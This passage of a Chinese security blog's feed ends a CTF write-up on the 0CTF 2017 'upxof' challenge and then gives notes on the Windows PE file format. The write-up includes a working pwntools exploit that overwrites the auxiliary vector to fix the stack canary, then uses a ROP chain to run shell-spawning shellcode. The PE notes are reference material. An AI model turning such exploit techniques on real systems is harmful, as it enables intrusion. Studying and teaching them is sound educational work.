0x47747e045c58c800</code></pre><p>最后基本上就可以知道 <code>Canary</code> 的起源是如下的方式：</p><pre><code>kernel----&gt;AT_RANDOM----&gt;fs:[0x28]----&gt;canary</code></pre><p>那么思路就分成了两步：</p><ol><li>在程序还没有链接的时候把 <code>auxv</code> 的结构体覆盖，修改 <code>AT_RANDOM</code> 以设置 <code>Canary</code> 为已知的值</li><li>接下来直接溢出做 ROP 或者直接跳到 shellcode 上</li></ol><p>现在看来这个 upx 壳显然是有意义的。需要在没有被脱壳的情况下，没有被载入前覆盖掉 <code>auxv</code>。第一次加载壳的时候可以输入长为 <code>0x4096</code> 的字符串，前八位则要求必须是 <code>12345678</code> 才能过 check。接下来解壳之后就可以溢出。</p><p>这题主要是理解 AUXV 以及善用 gdb 调试。脚本：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;p = process(&#39;./upxof&#39;)# id&#39;s of Auxillary VectorsAT_SYSINFO_EHDR = 0x21AT_HWCAP = 0x10AT_PAGESZ = 0x06AT_CLKTCK = 0x11AT_PHDR = 0x03AT_PHENT = 0x04AT_PHNUM = 0x05AT_BASE = 0x07AT_FLAGS = 0x08AT_ENTRY = 0x09AT_UID = 0x0BAT_EUID = 0x0CAT_GID = 0x0DAT_EGID = 0x0EAT_SECURE = 0x17AT_RANDOM = 0x19AT_EXECFN = 0x1FAT_PLATFORM = 0x0FAT_NULL = 0x00auxv = &#39;&#39;#auxv += p64(AT_SYSINFO_EHDR) + p64(0x7ffff7ffd000)#auxv += p64(AT_HWCAP) + p64(0x9f8bfbff)#auxv += p64(AT_PAGESZ) + p64(4096)#auxv += p64(AT_CLKTCK) + p64(100)auxv += p64(AT_PHDR) + p64(0x400040) # needed#auxv += p64(AT_PHENT) + p64(56)auxv += p64(AT_PHNUM) + p64(2) # needed#auxv += p64(AT_BASE) + p64(0x0)#auxv += p64(AT_FLAGS) + p64(0x0)auxv += p64(AT_ENTRY) + p64(0x400988) # needed#auxv += p64(AT_UID) + p64(0)#auxv += p64(AT_EUID) + p64(0)#auxv += p64(AT_GID) + p64(0)#auxv += p64(AT_EGID) + p64(0)#auxv += p64(AT_SECURE) + p64(0)auxv += p64(AT_RANDOM) + p64(0x601100) # Fake canary=0#auxv += p64(AT_EXECFN) + p64(0x7fffffffeff0)#auxv += p64(AT_PLATFORM) + p64(0x7fffffffe8e9)auxv += p64(AT_NULL) + p64(0)#gdb.attach(p)payload = &#39;12345678&#39;payload += p64(0) * 14 # offsetpayload += p64(1) # argcpayload += p64(0x601100) # argvpayload += p64(0)payload += p64(0x601100) * 10 # envppayload += p64(0)payload += auxvp.recvuntil(&#39;password:&#39;)p.sendline(payload)pop_rdi_ret = 0x00000000004007f3gets_plt = 0x00000000004005B0buf = 0x601100payload = &#39;\x00&#39; * 1048 + p64(pop_rdi_ret) + p64(buf) + p64(gets_plt) + p64(buf)p.recvuntil(&#39;:&#39;)p.sendline(payload)p.sendline(asm(shellcraft.sh()))p.interactive()</code></pre><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/</a><br><a href="https://www.anquanke.com/post/id/85203" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85203</a><br><a href="https://bbs.ichunqiu.com/thread-44069-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-44069-1-1.html</a><br><a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a><br><a href="https://www.jianshu.com/p/c3624f5dd583" target="_blank" rel="noopener">https://www.jianshu.com/p/c3624f5dd583</a><br><a href="https://deadc0de.re/articles/microwave-write-up.html" target="_blank" rel="noopener">https://deadc0de.re/articles/microwave-write-up.html</a><br><a href="https://braddaniels.org/csaw-quals-2017-scv/" target="_blank" rel="noopener">https://braddaniels.org/csaw-quals-2017-scv/</a><br><a href="https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/" target="_blank" rel="noopener">https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/</a><br><a href="https://n132.github.io/2019/02/25/2019-03-01-auxv-origin-of-canaries/" target="_blank" rel="noopener">https://n132.github.io/2019/02/25/2019-03-01-auxv-origin-of-canaries/</a><br><a href="https://github.com/L4ys/CTF/blob/master/0ctf-final-2017/upxof/exp.py" target="_blank" rel="noopener">https://github.com/L4ys/CTF/blob/master/0ctf-final-2017/upxof/exp.py</a><br><a href="https://github.com/D-I-E/writeups/tree/master/2017-ctfs/20170602-TCTF-Final/pwn-upxof" target="_blank" rel="noopener">https://github.com/D-I-E/writeups/tree/master/2017-ctfs/20170602-TCTF-Final/pwn-upxof</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RE入门（三）</title>
    <link href="/2019/01/28/RE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2019/01/28/RE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>摘自<a href="https://reversecore.com/" target="_blank" rel="noopener">《逆向工程核心原理》</a>中关于 Windows 操作系统的 PE（Portable Executable）文件格式的部分，其中也有关于进程、内存、DLL 等的内容，它们是 Windows 操作系统中最核心的部分。</p><a id="more"></a><h1 id="PE-文件格式"><a href="#PE-文件格式" class="headerlink" title="PE 文件格式"></a>PE 文件格式</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>PE 文件是 Windows 操作系统下使用的可执行文件格式。它是微软在 UNIX 平台的 COFF（Common Object File Format，通用对象文件格式）基础上制作而成的。最初（正如 Portable 这个单词所代表的那样）设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在 Windows 系列的操作系统下。</p><p>PE 文件是指 32 位的可执行文件，也称为 PE32。64 位的可执行文件成为 PE+ 或 PE32+，是 PE（PE32）文件的一种扩展形式（请注意不是 PE64）。</p><h2 id="PE-文件格式-1"><a href="#PE-文件格式-1" class="headerlink" title="PE 文件格式"></a>PE 文件格式</h2><p>PE 文件种类如表所示。</p><table><thead><tr><th style="text-align:center">种类</th><th style="text-align:center">主扩展名</th></tr></thead><tbody><tr><td style="text-align:center">可执行系列</td><td style="text-align:center">EXE、SCR</td></tr><tr><td style="text-align:center">库系列</td><td style="text-align:center">DLL、OCX、CPL、DRV</td></tr><tr><td style="text-align:center">驱动程序系列</td><td style="text-align:center">SYS、VXD</td></tr><tr><td style="text-align:center">对象文件系列</td><td style="text-align:center">OBJ</td></tr></tbody></table><p>严格地说，OBJ（对象）文件之外的所有文件都是可执行的。DLL、SYS 文件等虽然不能直接在 Shell（<code>Explorer.exe</code>）中运行，但可以使用其他方式（调试器、服务等）执行。</p><blockquote><p>根据 PE 正式规范，编译结果 OBJ 文件也视为 PE 文件。但是 OBJ 文件本身不能以任何形式执行，在代码逆向分析中几乎不需要关注它。</p></blockquote><p>接下来以记事本（Windows XP SP3 的 <code>notepad.exe</code>，与其他版本 Windows 下的 <code>notepad.exe</code> 文件结构类似，但是地址不同）程序进行简单说明。</p><p>下面是 <code>notepad.exe</code> 文件的起始部分，也是 PE 文件的头部分（PE header）。<code>notepad.exe</code> 文件运行需要的所有信息就存储在这个 PE 头中。如果加载到内存、从何处开始运行、运行中需要的 DLL 有哪些、需要多大的栈/堆内存等，大量信息以结构体形式存储在 PE 头中。换言之，学习 PE 文件格式就是学习 PE 头中的结构体。</p><p><img src="/pics/BIN集训/RE/三/1.png" srcset="/img/loading.gif" alt></p><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p><code>notepad.exe</code> 具有普通 PE 文件的基本结构。从 DOS 头（DOS header）到节区头（Section header）是 PE 头部分，其下的节区合称 PE 体。文件中使用偏移（offset），内存中使用 VA（Virtual Address，虚拟地址）来表示位置。文件加载到内存时，情况就会发生变化（节区的大小、位置等）。文件的内容一般可分为代码（<code>.text</code>）、数据（<code>.data</code>）、资源（<code>.rsrc</code>）节，分别保存。</p><blockquote><p>根据所用的不同开发工具（VB/VC++/Delphi/etc）与编译选项，节区的名称、大小、个数、存储的内容等都是不同的。最重要的是它们按照不同的用途分类保存到不同的节中。</p></blockquote><p>各节区头定义了各节区在文件或内存中的大小、位置、属性等。</p><p>PE 头与各节区的尾部存在一个区域，称为 NULL 填充（Null padding）。计算机中，为了提高处理文件、内存、网络包的效率，使用“最小基本单位”这一概念，PE 文件中也类似。文件/内存中节区的起始位置应该在各文件/内存最小单位的倍数位置上，空白区域将用 NULL 填充（可以看到各节区起始地址的截断都遵循一定的规则）。</p><p><img src="/pics/BIN集训/RE/三/2.png" srcset="/img/loading.gif" alt></p><h3 id="VA-amp-RVA"><a href="#VA-amp-RVA" class="headerlink" title="VA&amp;RVA"></a>VA&amp;RVA</h3><p>VA 指的是进程虚拟内存的绝对地址，RVA（Relative Virtual Address，相对虚拟地址）指从某个基准位置（ImageBase）开始的相对地址。VA 和 RVA 满足下面的换算关系。</p><pre><code>RVA+ImageBase=RA</code></pre><p>PE 头内部信息大多以 RVA 形式存在。原因在于，PE 文件（主要是 DLL）加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他 PE 文件（DLL）。此时必须通过重定位（Relocation）将其加载到其他空白的位置，若 PE 头信息使用的是 VA，则无法正常访问。因此使用 RVA 来定位信息，即使发生了重定位，只要相对于基准位置的相对地址没有变化，就能正常访问到指定信息，不会出现任何问题。</p><blockquote><p>32 位 Windows OS 中，各进程分配有 4GB 的虚拟内存，因此进程中 VA 值的范围是 00000000~FFFFFFFF。</p></blockquote><h2 id="PE-头"><a href="#PE-头" class="headerlink" title="PE 头"></a>PE 头</h2><p>PE 头由许多结构体组成。</p><h3 id="DOS-头"><a href="#DOS-头" class="headerlink" title="DOS 头"></a>DOS 头</h3><p>微软创建 PE 文件格式时，人们正广泛使用 DOS 文件，所以微软充分考虑了 PE 文件对 DOS 文件的兼容性。其结果是在 PE 头的最前面添加了一个 <code>IMAGE_DOS_HEADER</code> 结构体，用来扩展已有的 DOS EXE 头。</p><pre><code class="cpp">typedef struct _IMAGE_DOS_HEADER {    WORD    e_magic;         // DOS signature : 4D5A (&quot;MZ&quot;)    WORD    e_cblp;    WORD    e_cp;    WORD    e_crlc;    WORD    e_cparhdr;    WORD    e_minalloc;    WORD    e_maxalloc;    WORD    e_ss;    WORD    e_sp;    WORD    e_csum;    WORD    e_ip;    WORD    e_cs;    WORD    e_lfarlc;    WORD    e_ovno;    WORD    e_res[4];    WORD    e_oemid;    WORD    e_oeminfo;    WORD    e_res2[10];    LONG    e_lfanew;        // offset to NT header} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</code></pre><p><code>IMAGE_DOS_HEADER</code> 结构体的大小为 40 个字节。在该结构中必须知道 2 个重要成员：<code>e_magic</code> 与 <code>e_lfanew</code>。</p><ul><li><code>e_magic</code>：DOS 签名（signature，4D5A=&gt;ASCII 值“MZ”）</li><li><code>e_lfanew</code>：指示 NT 头的偏移（根据不同文件拥有可变值）</li></ul><p>所有 PE 文件在你开始部分（<code>e_magic</code>）都有 DOS 签名（“MZ”）。<code>e_lfanew</code> 值指向 NT 头所在位置（NT 头的名称为 <code>IMAGE_NT_HEADERS</code>，后面将会介绍）。</p><blockquote><p>一个名叫 Mark Zbikowski 的开发人员在微软设计了 DOS 可执行文件，MZ 即取自其名字的首字母。</p></blockquote><p><img src="/pics/BIN集训/RE/三/3.png" srcset="/img/loading.gif" alt></p><p>根据 PE 规范，文件开始的 2 个字节为 4D5A，<code>e_lfanew</code> 的值为 000000E0（不是 E0000000）</p><blockquote><p>Intel 系列的 CPU 以逆序存储数据，称为小端序标识法。</p></blockquote><p>如果尝试修改这些值，会发现程序无法正常运行（因为根据 PE 规范，它已不再是 PE 文件了）。</p><h3 id="DOS-存根"><a href="#DOS-存根" class="headerlink" title="DOS 存根"></a>DOS 存根</h3><p>DOS 存根（stub）在 DOS 头下方，是个可选项，且大小不固定（即使没有 DOS 存根，文件也能正常运行）。DOS 存根由代码与数据混合而成。</p><p><img src="/pics/BIN集训/RE/三/4.png" srcset="/img/loading.gif" alt></p><p>图中，文件偏移 40~4D 区域为 16 位的汇编指令。32 位的 Windos OS 中不会运行该命令（由于被识别为 PE 文件，所以完全忽视该代码）。在 DOS 环境中运行 <code>Notepad.exe</code> 文件，或者使用 DOS 调试器（<code>debug.exe</code>）运行它，可使其执行该代码（不认识 PE 文件格式，所以被识别为 DOS EXE 文件）。</p><p>在 Windows XP 下打开命令行窗口（<code>cmd.exe</code>），输入 <code>debug C:\Windows\notepad.exe</code>。输入 “u” 指令（Unassemble），将会出现 16 位的汇编指令。</p><pre><code>-u0B39:0000 0E            PUSH    CS0B39:0001 1F            POP     DS0B39:0002 BA0E00        MOV     DX,000E         ; DX = 0E : &quot;This program cannot be run in DOS mode&quot;0B39:0005 B409          MOV     AH,090B39:0007 CD21          INT     21              ; AH = 09 : WriteString()0B39:0009 B8014C        MOV     AX,4C010B39:000C CD21          INT     21              ; AX = 4C01 : Exit()0B39:000E 54            PUSH    SP0B39:000F 68            DB      680B39:0010 69            DB      690B39:0011 7320          JNB     00330B39:0013 7072          JO      00870B39:0015 6F            DB      6F0B39:0016 67            DB      670B39:0017 7261          JB      007A0B39:0019 6D            DB      6D0B39:001A 206361        AND     [BP+DI+61],AH0B39:001D 6E            DB      6E0B39:001E 6E            DB      6E0B39:001F 6F            DB      6F</code></pre><p>代码非常简单，在画面中输出字符串 <code>&quot;This program cannot be run in DOS mode&quot;</code> 后就退出。换言之，<code>notepad.exe</code> 文件虽然是 32 位的 PE 文件，但是带有 MS-DOS 兼容模式，可以在 DOS 环境中运行，执行 DOS EXE 代码，输出 <code>&quot;This program cannot be run in DOS mode&quot;</code> 后终止。灵活使用该特性可以在一个可执行文件（EXE）中创建出另一个文件，它在 DOS 与 Windows 中都能运行（在 DOS 环境中运行 16 位 DOS 代码，在 Windows 环境中运行 32 位 Windows 代码）。</p><p>如前所述，DOS 存根是可选项，开发工具应该支它（VB、VC++、Delphi 等默认支持 DOS 存根）。</p><h3 id="NT-头"><a href="#NT-头" class="headerlink" title="NT 头"></a>NT 头</h3><p>下面介绍 NT 头 <code>IMAGE_NT_HEADERS</code>。</p><pre><code class="cpp">typedef struct _IMAGE_NT_HEADERS {    DWORD Signature;                   // PE Signature : 50450000 (&quot;PE&quot;00)    IMAGE_FILE_HEADER FileHeader;    IMAGE_OPTIONAL_HEADER32 OptionalHeader;} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</code></pre><p><code>IMAGE_NT_HEADERS</code> 结构体由 3 个成员组成，第一个成员为签名（Signature）结构体，其值为 50450000h（”PE”00）。另外沥青个成员分别为文件头（File Header）与可选头（Optional Header）结构体。</p><p><img src="/pics/BIN集训/RE/三/5.png" srcset="/img/loading.gif" alt></p><p><code>IMAGE_NT_HEADERS</code> 结构体的大小为 F8，相当大。</p><h3 id="NT-头：文件头"><a href="#NT-头：文件头" class="headerlink" title="NT 头：文件头"></a>NT 头：文件头</h3><p>文件头是表现文件大致属性的 <code>IMAGE_FILE_HEADER</code> 结构体。</p><pre><code class="cpp">typedef struct _IMAGE_FILE_HEADER {    WORD    Machinie;               // 运行平台    WORD    NumberOfSections;       // 区块表的个数    DWORD   TimeDateStamp;          // 文件创建时间，是从 1970 年至今的秒数    DWORD   PointerToSymbolTable;   // 指向符号表的指针    DWORD   NumberOfSymbols;        // 符号表的数目    WORD    SizeOfOptionalHeader;   // IMAGE_NT_HEADERS 结构中 OptionHeader 成员的大小，对于 Win32 平台这个值通常是 0x00E0    WORD    Characteriistics;       // 文件的属性值} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</code></pre><p><code>IMAGE_FILE_HEADERS</code> 结构体中有如下 4 中重要成员（若它们设置不正确，将导致文件无法正常运行）。</p><h4 id="Machine"><a href="#Machine" class="headerlink" title="Machine"></a>Machine</h4><p>每个 CPU 都拥有唯一的 Machine 码，兼容 32 位 Intel x86 芯片的 Machine 码为 14C。以下是定义在 <code>winnt.h</code> 文件中的 Machine 码。</p><pre><code class="cpp">#define IMAGE_FILE_MACHINE_UNKNOWN      0#define IMAGE_FILE_MACHINE_I386         0x014c  // Intel 386.#define IMAGE_FILE_MACHINE_R3000        0x0162  // MIPS little-endian, 0x160 big-endian#define IMAGE_FILE_MACHINE_R4000        0x0166  // MIPS little-endian#define IMAGE_FILE_MACHINE_R10000       0x0168  // MIPS little-endian#define IMAGE_FILE_MACHINE_WCEMIPSV2    0x0169  // MIPS little-endian WCE v2#define IMAGE_FILE_MACHINE_ALPHA        0x0184  // Alpha_AXP#define IMAGE_FILE_MACHINE_POWERPC      0x01F0  // IBM PowerPC Little-Endian#define IMAGE_FILE_MACHINE_SH3          0x01a2  // SH3 little-endian#define IMAGE_FILE_MACHINE_SH3E         0x01a4  // SH3E little-endian#define IMAGE_FILE_MACHINE_SH4          0x01a6  // SH4 little-endian#define IMAGE_FILE_MACHINE_ARM          0x01c0  // ARM Little-endian#define IMAGE_FILE_MACHINE_THUMB        0x01c2#define IMAGE_FILE_MACHINE_IA64         0x0200  // Intel 64#define IMAGE_FILE_MACHINE_MIPS16       0x0266  // MIPS#define IMAGE_FILE_MACHINE_MIPSFPU      0x0366  // MIPS#define IMAGE_FILE_MACHINE_MIPSFPU16    0x0466  // MIPS#define IMAGE_FILE_MACHINE_ALPHA64      0x0284  // ALPHA64#define IMAGE_FILE_MACHINE_AXP64        IMAGE_FILE_MACHINE_ALPHA64</code></pre><h4 id="NumberOfSections"><a href="#NumberOfSections" class="headerlink" title="NumberOfSections"></a>NumberOfSections</h4><p>前面提到过，PE 文件把代码、数据、资源等依据属性分类到各节区中存储。</p><p><code>NumberOfSections</code> 用来指出文件中存在的节区数量。该值一定要大于 0，且当定义的节区数量与实际节区不同时，将发生运行错误。</p><h4 id="SizeOfOptionalHeader"><a href="#SizeOfOptionalHeader" class="headerlink" title="SizeOfOptionalHeader"></a>SizeOfOptionalHeader</h4><p><code>IMAGE_NT_HEADER</code> 结构体的最后一个成员为 <code>IMAGE_OPTIONAL_HEADER32</code> 结构体。<code>SizeOfOptionalHeader</code> 成员用来指出 <code>IMAGE_OPTIONAL_HEADER32</code> 结构体的长度。<code>IMAGE_OPTIONAL_HEADER32</code> 结构体由 C 语言编写而成，故其大小已经确定。但是 Windows 的 PE 装载器需要查看 <code>IMAGE_FILE_HEADER</code> 的 <code>SizeOfOptionalHeader</code> 值，从而识别出 <code>IMAGE_OPTIONAL_HEADER32</code> 结构体的大小。</p><p>PE32+ 格式的文件中使用的是 <code>IMAGE_OPTIONAL_HEADER64</code> 结构体，而不是 <code>IMAGE_OPTIONAL_HEADER32</code> 结构体。2 个结构体的尺寸是不同的，所以需要在 <code>SizeOfOptionalHeader</code> 成员中明确指出结构体的大小。</p><blockquote><p>借助 <code>IMAGE_DOS_HEADER</code> 的 <code>e_lfanew</code> 成员与 <code>IMAGE_FILE_HEADER</code> 的 <code>SizeOfOptionalHeader</code> 成员，可以创建出一种脱离常规的 PE 文件（PE Patch）（也有人称之为 “麻花” PE 文件）</p></blockquote><h4 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics"></a>Characteristics</h4><p>该字段用于标识文件的属性，文件是否可运行的形态、是否为 DLL 文件等信息，以 bit OR 形式组合起来。</p><p>以下是定义在 <code>winnt.h</code> 文件中的 <code>Characteristics</code> 值（请记住 0002h 与 2000h 这两个值）。</p><pre><code class="cpp">#define IMAGE_FILE_RELOCS_STRIPPED          0x0001  // Relocation info stripped from file.#define IMAGE_FILE_EXECUTABLE_IMAGE         0x0002  // File is executable                                                    // (i.e. no unresolved externel references).#define IMAGE_FILE_LINE_NUMS_STRIPPED       0x0004  // Line numbers stripped from file.#define IMAGE_FILE_LOCAL_SYMS_STRIPPED      0x0008  // Local symbols stripped from file.#define IMAGE_FILE_AGGRESIVE_WS_TRIM        0x0010  // Agressively trim working set#define IMAGE_FILE_LARGE_ADDRESS_AWARE      0x0020  // App can handle &gt;2gb addresses#define IMAGE_FILE_BYTES_REVERSED_LO        0x0080  // byte of machine word are reversed.#define IMAGE_FILE_32BIT_MACHINE            0x0100  // 32 bit word machine.#define IMAGE_FILE_DEBUG_STRIPPED           0x0200  // Debugging info stripped from                                                    // file in .DBG file#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP  0x0400  // If Image is on removable media,                                                    // copy and run from the swap file.#define IMAGE_FILE_NET_RUN_FROM_SWAP        0x0800  // If Image is on Net,                                                    // copy and run from the swap file.#define IMAGE_FILE_SYSTEM                   0x1000  // System File.#define IMAGE_FILE_DLL                      0x2000  // File is a DLL.#define IMAGE_FILE_UP_SYSTEM_ONLY           0x4000  // File should only be run on a UP machine#define IMAGE_FILE_BYTES_REVERSED_HI        0x8000  // byte of machine word are reversed.</code></pre><p>PE 中 <code>Characteristics</code> 的值有可能不是 0002h（不可执行），比如类似 <code>*.obj</code> 的 object 文件以及 resource DLL 文件等。</p><p>最后讲一下 <code>IMAGE_FILE_HEADER</code> 的 <code>TimeDateStamp</code> 成员。改成成员的值不影响文件运行，用来记录编译器创建此文件的时间。但是有些开发工具（VB、VC++）提供了设置该值的工具，而有些开发工具（Delphi）则未提供（且随所用选项的不同而不同）。</p><h4 id="IMAGE-FILE-HEADER"><a href="#IMAGE-FILE-HEADER" class="headerlink" title="IMAGE_FILE_HEADER"></a>IMAGE_FILE_HEADER</h4><p><code>IMAGE_FILE_HEADER</code> 的结构体。</p><p><img src="/pics/BIN集训/RE/三/6.png" srcset="/img/loading.gif" alt></p><p>以结构体成员的形式表示如下。</p><pre><code>[ IMAGE_FILE_HEADER ] - notepad.exe offset   value   description--------------------------------------------------------------------------000000E4     014C machine000000E6     0003 number of sections000000E8 48025287 time date stamp (Mon Apr 14 03:35:51 2008)000000EC 00000000 offset to symble table000000F0 00000000 number of symbols000000F4     00E0 size of optional header000000F6     010F characteristics                      IMAGE_FILE_RELOCS_STRIPPED                      IMAGE_FILE_EXECUTABLE_IMAGE                      IMAGE_FILE_LINE_NUMS_STRIPPED                      IMAGE_FILE_LOCAL_SYMS_STRIPPED                      IMAGE_FILE_32BIT_MACHINE</code></pre><h3 id="NT-头：可选头"><a href="#NT-头：可选头" class="headerlink" title="NT 头：可选头"></a>NT 头：可选头</h3><p><code>IMAGE_OPTIIONAL_HEADER32</code> 是 PE 头结构体中最大的。</p><pre><code class="cpp">typedef struct _IMAGE_DATA_DIRECTORY {    DWORD   VirtualAddress;    DWORD   Size;} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16typedef struct _IMAGE_OPTIONAL_HEADER {    // Standard fields.    WORD    Magic;                          // 标志字, ROM 映像（0107h），普通可执行文件（010Bh）    BYTE    MajorLinkerVersion;             // 链接程序的主版本号    BYTE    MinorLinkerVersion;             // 链接程序的次版本号    DWORD   SizeOfCode;                     // 所有含代码的节的总大小    DWORD   SizeOfInitializedData;          // 所有含已初始化数据的节的总大小    DWORD   SizeOfUninitializedData;        // 所有含未初始化数据的节的大小    DWORD   AddressOfEntryPoint;            // 程序执行入口 RVA    DWORD   BaseOfCode;                     // 代码的区块的起始 RVA    DWORD   BaseOfData;                     // 数据的区块的起始 RVA    // NT additional fields.    DWORD   ImageBase;                      // 程序的首选装载地址    DWORD   SectionAlignment;               // 内存中的区块的对齐大小，一般为 0x1000    DWORD   FileAlignment;                  // 文件中的区块的对齐大小，一般为 0x200    WORD    MajorOperatingSystemVersion;    // 要求操作系统最低版本号的主版本号    WORD    MinorOperatingSystemVersion;    // 要求操作系统最低版本号的副版本号    WORD    MajorImageVersion;              // 可运行于操作系统的主版本号    WORD    MinorImageVersion;              // 可运行于操作系统的次版本号    WORD    MajorSubsystemVersion;          // 要求最低子系统版本的主版本号    WORD    MinorSubsystemVersion;          // 要求最低子系统版本的次版本号    DWORD   Win32VersionValue;              // 莫须有字段，不被病毒利用的话一般为 0    DWORD   SizeOfImage;                    // 映像装入内存后的总尺寸    DWORD   SizeOfHeaders;                  // 所有头 + 区块表的尺寸大小    DWORD   CheckSum;                       // 映像的校检和    WORD    Subsystem;                      // 可执行文件期望的子系统    WORD    DllCharacteristics;             // DllMain() 函数何时被调用，默认为 0    DWORD   SizeOfStackReserve;             // 初始化时的栈大小    DWORD   SizeOfStackCommit;              // 初始化时实际提交的栈大小    DWORD   SizeOfHeapReserve;              // 初始化时保留的堆大小    DWORD   SizeOfHeapCommit;               // 初始化时实际提交的堆大小    DWORD   LoaderFlags;                    // 与调试有关，默认为 0    DWORD   NumberOfRvaAndSizes;            // 下边数据目录的项数，这个字段自Windows NT 发布以来一直是16    // 数据目录表，保存了各种表的RVA及大小    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</code></pre><p>在 <code>IMAGE_OPTIONAL_HEADER32</code> 结构体中需要关注下列成员。这些值谁文件运行必需的，设置错误将导致文件无法正常运行。</p><h4 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h4><p>为 <code>IMAGE_OPTIONAL_HEADER32</code> 结构体时，Magic 码为 10B；为 <code>IMAGE_OPTIONAL_HEADER64</code> 结构体时，Magic 码为 20B。</p><h4 id="AddressOfEntryPoint"><a href="#AddressOfEntryPoint" class="headerlink" title="AddressOfEntryPoint"></a>AddressOfEntryPoint</h4><p><code>AddressOfEntryPoint</code> 持有 EP 的 RVA 值。该值指出程序最先执行的代码起始地址，相当重要。</p><h4 id="ImageBase"><a href="#ImageBase" class="headerlink" title="ImageBase"></a>ImageBase</h4><p>进程虚拟内存的范围时 0~FFFFFFFF（32 位系统）。PE 文件被加载到如此大的内存中时，<code>ImageBase</code> 指出文件的优先装入地址。</p><p>EXE、DLL 文件被装载到用户内存的 0~7FFFFFFF 中，SYS 文件被载入内核内存的 80000000~FFFFFFFF 中。一般而言，使用开发工具（VB/VC++/Delphi）创建好 EXE 文件后，其 <code>ImgaeBase</code> 的值为 00400000，DLL 文件的 <code>ImgaeBase</code> 值为 10000000（当然也可以指定为其他值）。执行 PE 文件时，PE 装载器先创建进程，再将文件载入内存，然后把 EIP 寄存器的值设置为 <code>ImageBase+AddressOfEntryPoint</code>。</p><h4 id="SectiionAlignment，FileAlignment"><a href="#SectiionAlignment，FileAlignment" class="headerlink" title="SectiionAlignment，FileAlignment"></a>SectiionAlignment，FileAlignment</h4><p>PE 文件的 Body 部分划分为若干节区，这些节存储着不同类别的数据。<code>FileAlignment</code> 指定了节区在磁盘文件中的最小单位，而 <code>SectionAlignment</code> 则指定了节区在内存中的最小单位（一个文件中，<code>FileAlignment</code> 与 <code>SectionAlignment</code> 的值可能相同，也可能不同）。磁盘文件或内存的节区大小必定为 <code>FileAlignment</code> 或 <code>SectionAlignment</code> 值的整数倍。</p><h4 id="SizeOfImage"><a href="#SizeOfImage" class="headerlink" title="SizeOfImage"></a>SizeOfImage</h4><p>加载 PE 文件到内存时，<code>SizeOfImage</code> 指定了 PE Image 在虚拟内存中所占的空间的大小。一般而言，文件的大小与加载到内存中的大小是不同的（节区头中定义了各节装载的位置与占有内存的大小）。</p><h4 id="SizeOfHeader"><a href="#SizeOfHeader" class="headerlink" title="SizeOfHeader"></a>SizeOfHeader</h4><p><code>SizeOfHeader</code> 用来指出整个 PE 头的大小。该值也必须是 <code>FileAlignment</code> 的整数倍。第一节区所在位置与 <code>SizeOfHeader</code> 距文件开始偏移的量相同。</p><h4 id="Subsystem"><a href="#Subsystem" class="headerlink" title="Subsystem"></a>Subsystem</h4><p>该 <code>Subsystem</code> 值用来区分系统驱动文件（<code>*.sys</code>）与普通的可执行文件（<code>*.exe</code>，<code>*.dll</code>）。<code>Subsystem</code> 成员可拥有的值如下。</p><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">含义</th><th style="text-align:center">备注</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">Driver 文件</td><td style="text-align:center">系统驱动（如：<code>ntfs.sys</code>）</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">GUI 文件</td><td style="text-align:center">窗口应用程序（如：<code>notepad.exe</code>）</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">CUI 文件</td><td style="text-align:center">控制台应用程序（如：<code>cmd.exe</code>）</td></tr></tbody></table><h4 id="NumberOfRvaAndSizes"><a href="#NumberOfRvaAndSizes" class="headerlink" title="NumberOfRvaAndSizes"></a>NumberOfRvaAndSizes</h4><p><code>NumberOfRvaAndSizes</code> 用来指定 <code>DataDirectory</code>（<code>IMAGE_OPTIONAL_HEADER32</code> 结构体的最后一个成员）数组的个数。虽然结构体定义中明确指出了数组个数为 <code>IMAGE_NUMBEROF_DIRECTORY_ENTRIES(16)</code>，但是 PE 装载器通过查看 <code>NumberOfRvaAndSizes</code> 值来识别数组大小，换言之，数组大小也可能不是 16。</p><h4 id="DataDirectory"><a href="#DataDirectory" class="headerlink" title="DataDirectory"></a>DataDirectory</h4><p><code>DataDirectory</code> 是由 